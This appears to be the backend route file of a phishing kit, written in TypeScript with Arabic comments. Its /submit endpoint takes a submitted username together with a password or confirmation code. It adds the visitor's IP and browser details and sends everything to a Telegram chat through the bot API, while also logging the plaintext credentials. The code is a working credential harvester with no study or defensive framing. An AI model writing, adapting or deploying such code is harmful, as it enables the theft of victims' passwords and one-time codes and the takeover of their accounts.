import "dotenv/config";
import { Router, type IRouter, Request, Response } from "express";
import healthRouter from "./health";

const router: IRouter = Router();

router.use(healthRouter);

// ============================================
// 🔐 Endpoint لإرسال التنبيهات إلى تليجرام
// ============================================
router.post("/submit", async (req: Request, res: Response) => {
  // ✅ دائماً أرسل JSON
  res.setHeader("Content-Type", "application/json");
  
  try {
    // ✅ سجل كل شيء
    console.log('📥 [1] Request received at /submit');
    console.log('📥 [2] Request body:', req.body);

    const { username, password, timestamp, userAgent } = req.body;
    console.log('📥 [3] Extracted data:', { username, password, timestamp, userAgent });

    // ✅ التحقق من وجود البيانات
    if (!username) {
      console.log('📥 [4] ❌ Username missing');
      return res.status(400).send(JSON.stringify({ error: "Username is required" }));
    }

    // ✅ متغيرات البيئة
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    console.log('📥 [5] Bot Token exists?', !!botToken);
    console.log('📥 [6] Chat ID exists?', !!chatId);

    if (!botToken || !chatId) {
      console.error("📥 [7] ❌ Telegram credentials not configured");
      console.error("📥 [8] Bot Token:", botToken);
      console.error("📥 [9] Chat ID:", chatId);
      return res.status(500).send(JSON.stringify({ error: "Telegram not configured" }));
    }

    // ✅ IP
    const ip = req.headers['x-forwarded-for'] || req.ip || 'غير معروف';
    console.log('📥 [10] IP:', ip);

    // ✅ بناء الرسالة
    const isCode = username === "🔐 رمز التأكيد";
    const title = isCode ? "🔐 رمز التأكيد" : "🔐 محاولة دخول جديدة";
    const label = isCode ? "📱 رمز التأكيد:" : "🔑 كلمة المرور:";

    const message = `
${title}

👤 اسم المستخدم: ${username}
${label} ${password}
⏱️ الوقت: ${timestamp || new Date().toLocaleString()}
🌐 IP: ${ip}
📱 المتصفح: ${userAgent || 'غير معروف'}
    `;
    console.log('📥 [11] Message to send:', message);

    // ✅ إرسال إلى تليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log('📥 [12] Sending to Telegram...');
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        // ❌ حذف parse_mode
      }),
    });

    console.log('📥 [13] Telegram response status:', response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("📥 [14] ❌ Telegram error:", errorText);
      return res.status(500).send(JSON.stringify({ error: "Failed to send Telegram message" }));
    }

    console.log("📥 [15] ✅ Telegram notification sent for:", username);
    res.status(200).send(JSON.stringify({ success: true }));

  } catch (error) {
    console.error("📥 [16] ❌ Server error:", error);
    console.error("📥 [17] Error details:", error.message);
    console.error("📥 [18] Error stack:", error.stack);
    res.status(500).send(JSON.stringify({ 
      error: "Internal server error",
      details: error.message 
    }));
  }
});

export default router;
